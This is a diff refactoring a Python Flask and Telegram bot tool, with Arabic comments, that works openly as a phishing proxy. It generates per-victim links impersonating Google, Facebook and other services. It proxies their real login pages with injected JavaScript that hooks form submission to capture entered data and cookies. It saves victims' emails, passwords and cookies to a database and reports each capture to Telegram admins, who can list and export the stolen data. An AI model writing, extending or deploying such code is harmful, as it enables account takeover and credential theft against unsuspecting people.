@@ -8,15 +8,12 @@ import os
 import json
 import sqlite3
 import threading
-import re
-import base64
 import secrets
-from datetime import datetime
-from flask import Flask, request, jsonify, redirect, make_response, render_template_string
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, ContextTypes
 import requests
-from urllib.parse import urlparse, parse_qs
+from datetime import datetime
+from flask import Flask, request, jsonify, redirect, make_response
+from telegram import Update
+from telegram.ext import Application, CommandHandler, ContextTypes
 
 # ========== الإعدادات ==========
 TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
@@ -26,6 +23,8 @@ if not TELEGRAM_TOKEN:
     raise ValueError("يرجى تعيين TELEGRAM_TOKEN في متغيرات البيئة")
 if not ADMIN_IDS:
     raise ValueError("يرجى تعيين ADMIN_IDS في متغيرات البيئة")
+
+BASE_URL = os.environ.get("BASE_URL", "http://localhost:5000")
 
 # ========== Flask App ==========
 app = Flask(__name__)
@@ -93,16 +92,13 @@ def mark_as_viewed(vid):
 
 # ========== توليد روابط التصيد ==========
 def generate_session_id(target):
-    """توليد معرف جلسة فريد لكل ضحية"""
     return f"{target}_{secrets.token_urlsafe(6)}"
 
 def generate_phish_link(target):
-    """توليد رابط التصيد"""
     session_id = generate_session_id(target)
-    base_url = os.environ.get("BASE_URL", "http://localhost:5000")
-    return f"{base_url}/phish/{session_id}", session_id
+    return f"{BASE_URL}/phish/{session_id}", session_id
 
-# ========== خادم التصيد (المحطة الوسيطة) ==========
+# ========== خادم التصيد ==========
 @app.route('/')
 def home():
     return "🚀 Phishing Proxy Server is running!"
@@ -113,11 +109,8 @@ def health():
 
 @app.route('/phish/<session_id>', methods=['GET', 'POST'])
 def phish_page(session_id):
-    """عرض الموقع الحقيقي مع اعتراض الطلبات"""
-    # استخراج الهدف من session_id
     target = session_id.split('_')[0] if '_' in session_id else 'google'
     
-    # تحديد الوجهة الحقيقية
     targets = {
         'google': 'https://accounts.google.com',
         'facebook': 'https://www.facebook.com',
@@ -131,51 +124,39 @@ def phish_page(session_id):
     }
     real_url = targets.get(target, 'https://accounts.google.com')
     
-    # إذا كان طلب POST (تسجيل دخول)
     if request.method == 'POST':
-        # جمع بيانات الدخول
         email = request.form.get('email') or request.form.get('username') or request.form.get('login') or ''
         password = request.form.get('password') or request.form.get('pass') or ''
-        
-        # اعتراض الكوكيز من الطلب
         cookies = {k: v for k, v in request.cookies.items()}
-        
-        # حفظ البيانات
         ip = request.remote_addr
         ua = request.headers.get('User-Agent', '')
         save_victim(session_id, target, email, password, cookies, ip, ua)
         
-        # إرسال إشعار فوري إلى تيليجرام
+        # إشعار للبوت
         try:
             import requests as req
-            msg = f"🔴 **اختراق جديد!**\n\n🎯 **الهدف:** `{target}`\n🆔 **الجلسة:** `{session_id}`\n📧 **البريد:** `{email}`\n🔑 **كلمة المرور:** `{password}`\n🕒 **الوقت:** {datetime.now().strftime('%H:%M:%S')}\n\n🍪 **الكوكيز:** {len(cookies)} كوكي"
+            msg = f"🔴 **اختراق جديد!**\n\n🎯 **الهدف:** `{target}`\n🆔 **الجلسة:** `{session_id}`\n📧 **البريد:** `{email}`\n🔑 **كلمة المرور:** `{password}`\n🕒 **الوقت:** {datetime.now().strftime('%H:%M:%S')}\n🍪 **الكوكيز:** {len(cookies)} كوكي"
             req.post(f"http://localhost:5000/notify", json={"text": msg, "session_id": session_id})
         except:
             pass
         
-        # إعادة التوجيه إلى الموقع الحقيقي (لإخفاء الشك)
         return redirect(real_url)
     
-    # طلب GET: عرض الموقع الحقيقي
+    # GET: عرض الموقع الأصلي
     try:
         response = requests.get(real_url, headers={'User-Agent': request.headers.get('User-Agent', '')})
         html = response.text
         
-        # إضافة حمولة JavaScript لسرقة الكوكيز (حتى HttpOnly)
         inject_script = f"""
         <script>
         (function() {{
-            // جمع كل الكوكيز
             let cookies = document.cookie.split(';').reduce((o, c) => {{
                 let [k, v] = c.trim().split('=');
                 o[k] = v;
                 return o;
             }}, {{}});
-            
-            // إضافة session_id للكوكيز
             cookies._session_id = '{session_id}';
             
-            // اعتراض طلبات POST
             let originalSubmit = HTMLFormElement.prototype.submit;
             HTMLFormElement.prototype.submit = function() {{
                 let form = this;
@@ -183,7 +164,6 @@ def phish_page(session_id):
                 let data = {{}};
                 for (let [k, v] of formData) data[k] = v;
                 
-                // إرسال البيانات إلى خادمنا
                 fetch('/collect', {{
                     method: 'POST',
                     headers: {{'Content-Type': 'application/json'}},
@@ -194,28 +174,19 @@ def phish_page(session_id):
                         cookies: cookies
                     }})
                 }});
-                
                 originalSubmit.call(form);
             }};
         }})();
         </script>
         """
         
-        # حقن الكود قبل </body>
         html = html.replace('</body>', inject_script + '</body>')
-        
-        response = make_response(html)
-        return response
+        return make_response(html)
     except:
-        return render_template_string("""
-        <h1>⚠️ جاري التحميل...</h1>
-        <p>يتم توجيهك إلى الموقع المطلوب.</p>
-        <script>window.location.href = 'https://accounts.google.com';</script>
-        """)
+        return redirect('https://accounts.google.com')
 
 @app.route('/collect', methods=['POST'])
 def collect():
-    """استقبال البيانات من الجافاسكريبت"""
     data = request.json
     session_id = data.get('session_id')
     email = data.get('email', '')
@@ -225,35 +196,26 @@ def collect():
     if session_id:
         ip = request.remote_addr
         ua = request.headers.get('User-Agent', '')
-        # استخراج الهدف من session_id
         target = session_id.split('_')[0] if '_' in session_id else 'unknown'
         save_victim(session_id, target, email, password, cookies, ip, ua)
-        
-        # إشعار للبوت
         try:
             import requests as req
-            msg = f"🆕 **بيانات جديدة عبر JS!**\n?? الهدف: {target}\n📧 {email if email else 'غير موجود'}\n🍪 {len(cookies)} كوكي"
+            msg = f"🆕 **بيانات جديدة عبر JS!**\n🎯 الهدف: {target}\n📧 {email if email else 'غير موجود'}\n🍪 {len(cookies)} كوكي"
             req.post(f"http://localhost:5000/notify", json={"text": msg, "session_id": session_id})
         except:
             pass
-    
     return jsonify({"status": "ok"}), 200
 
 @app.route('/notify', methods=['POST'])
 def notify():
-    """استقبال الإشعارات من داخل التطبيق لإرسالها إلى تيليجرام"""
     data = request.json
     text = data.get('text', '')
-    session_id = data.get('session_id', '')
-    
-    # إرسال إلى تيليجرام
     bot = Application.builder().token(TELEGRAM_TOKEN).build()
     for admin_id in ADMIN_IDS:
         bot.bot.send_message(chat_id=admin_id, text=text, parse_mode='Markdown')
-    
     return jsonify({"status": "ok"}), 200
 
-# ========== بوت تيليجرام ==========
+# ========== أوامر البوت ==========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMIN_IDS:
         await update.message.reply_text("⛔ غير مصرح لك.")
@@ -267,9 +229,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/view <id> - عرض الكوكيز\n"
         "/export <id> - تصدير الكوكيز\n"
         "/delete <id> - حذف ضحية\n"
-        "/stats - إحصائيات\n\n"
-        "**الأهداف المدعومة:**\n"
-        "google, facebook, microsoft, apple, github, twitter, instagram, linkedin, amazon",
+        "/stats - إحصائيات",
         parse_mode='Markdown'
     )
 
@@ -286,7 +246,7 @@ async def phish(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🎯 **الهدف:** `{target}`\n"
         f"🆔 **الجلسة:** `{session_id}`\n"
         f"🔗 **الرابط:** {link}\n\n"
-        f"📤 **شارك الرابط** مع الضحية. عند تسجيل الدخول، ستصل البيانات فوراً.",
+        f"📤 **شارك الرابط** مع الضحية.",
         parse_mode='Markdown'
     )
 
@@ -295,7 +255,7 @@ async def list_victims(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     victims = get_all_victims()
     if not victims:
-        await update.message.reply_text("📭 لا يوجد ضحايا حتى الآن.")
+        await update.message.reply_text("📭 لا يوجد ضحايا.")
         return
     msg = "📋 **الضحايا:**\n\n"
     for v in victims:
@@ -317,7 +277,6 @@ async def view_victim(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cookies, email, password, target = data
     mark_as_viewed(vid)
     cookies_data = json.loads(cookies)
-    
     msg = (
         f"🍪 **كوكيز الضحية #{vid}**\n\n"
         f"🎯 **الهدف:** {target}\n"
@@ -342,7 +301,6 @@ async def export_victim(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     cookies, email, password, target = data
     cookies_data = json.loads(cookies)
-    
     export = {
         "id": vid,
         "target": target,
@@ -356,7 +314,7 @@ async def export_victim(update: Update, context: ContextTypes.DEFAULT_TYPE):
         json.dump(export, f, indent=2)
     await update.message.reply_document(
         document=open(filename, "rb"),
-        caption=f"📦 بيانات الضحية #{vid} (كوكيز + بيانات دخول)"
+        caption=f"📦 بيانات الضحية #{vid}"
     )
     os.remove(filename)
 
@@ -377,15 +335,11 @@ async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     total = len(victims)
     viewed = len([v for v in victims if v[5] == 'viewed'])
     new = total - viewed
-    
-    # إحصائيات حسب الهدف
     targets = {}
     for v in victims:
         target = v[2]
         targets[target] = targets.get(target, 0) + 1
-    
     target_stats = "\n".join([f"   🎯 {t}: {c}" for t, c in targets.items()])
-    
     await update.message.reply_text(
         f"📊 **إحصائيات**\n\n"
         f"👤 **إجمالي الضحايا:** `{total}`\n"
@@ -398,17 +352,16 @@ async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await start(update, context)
 
-# ========== المدخل الرئيسي ==========
+# ========== تشغيل الخادم والبوت معاً ==========
 if __name__ == "__main__":
     init_db()
     
-    # تشغيل Flask في خيط منفصل
+    # تشغيل Flask
     def run_flask():
         port = int(os.environ.get("PORT", 5000))
         app.run(host="0.0.0.0", port=port)
     
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
-    flask_thread.start()
+    threading.Thread(target=run_flask, daemon=True).start()
     
     # تشغيل البوت
     application = Application.builder().token(TELEGRAM_TOKEN).build()
